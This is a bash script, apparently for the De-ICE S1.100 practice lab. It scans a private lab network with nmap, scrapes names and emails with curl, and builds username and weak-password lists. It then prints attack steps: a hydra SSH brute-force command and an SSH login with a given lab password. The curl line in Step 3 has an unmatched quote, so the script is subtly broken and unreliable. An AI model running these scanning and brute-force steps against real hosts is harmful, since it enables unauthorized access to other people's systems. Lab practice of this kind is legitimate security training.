#!/bin/bash

# De-ICE S1.100 Reconnaissance Script
echo "=== De-ICE S1.100 Reconnaissance ==="
echo "Target: Lab network (172.20.0.0/24)"
echo ""

echo "[+] Step 1: Network Discovery"
echo "nmap -sn 172.20.0.0/24"
nmap -sn 172.20.0.0/24
echo ""

echo "[+] Step 2: Port Scanning Discovered Hosts"  
echo "nmap -sC -sV 172.20.0.3 172.20.0.4 172.20.0.5 172.20.0.6 172.20.0.7"
nmap -sC -sV 172.20.0.3 172.20.0.4 172.20.0.5 172.20.0.6 172.20.0.7
echo ""

echo "[+] Step 3: Web Enumeration"
echo "curl -s http://172.20.0.3 | grep -E '(Name|Email)'"
curl -s http://172.20.0.3 | grep -E '(Name|Email)'"
echo ""

echo "[+] Step 4: Generate Username List"
cat > /root/lab/users.txt << 'EOF'
aadams
bbanter  
ccoffee
ddeeds
eeikman
root
admin
EOF
echo "Created users.txt with potential usernames"

echo "[+] Step 5: Generate Password List"
cat > /root/lab/passwords.txt << 'EOF'
nostaw
password
password123
123456
admin
root
EOF
echo "Created passwords.txt with common weak passwords"

echo ""
echo "=== Ready for Exploitation ==="
echo "Next steps:"
echo "1. FTP enumeration: ftp 172.20.0.5"
echo "2. SSH brute force: hydra -L users.txt -P passwords.txt 172.20.0.4 ssh -s 2222"
echo "3. SSH access: ssh -p 2222 aadams@172.20.0.4 (password: nostaw)"